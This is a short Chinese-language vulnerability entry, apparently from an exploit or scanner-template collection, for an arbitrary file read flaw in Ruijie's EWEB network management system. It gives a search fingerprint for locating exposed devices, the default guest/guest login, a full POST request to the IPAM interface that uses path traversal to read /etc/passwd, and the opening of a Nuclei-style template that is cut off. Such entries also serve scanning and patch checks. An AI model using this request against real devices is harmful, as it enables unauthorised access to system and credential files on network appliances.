# 锐捷ewebipam.php存在任意文件读取漏洞

- **系统**：锐捷　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title=”锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`
- **关键头**：`id: ruijie-eweb-ipam-fileread`　`name: 锐捷网络 EWEB IPAM 任意文件读取漏洞`　`author: qq`　`severity: critical`

**请求体 / payload**
```
默认账号密码登录系统
Host:
Content-Type: application/x-www-form-urlencoded
username=guest&password=guest?
构造请求
POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Cookie: RUIJIEID=eefae4v54ajbanfhvn0aqgaok5; path=/; HttpOnly
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
path=../../../../etc/passwd
锐捷网络 EWEB 网管系统的 IPAM 接口存在任意文件读取漏洞，攻击者可以通过特定的参数读取服务器上的敏感文件。
metadata:
fofa-query: title="锐捷网络-EWEB网管系统"
verified: true
max-request: 2
tags: ruijie, fileread
http:
- method: POST
path:
- "{{BaseURL}}/ddi/server/login.php"
body: "username=guest&password=gue…（脚本共 1147 字，完整版见原文）
```
- **预期**：200　|　root：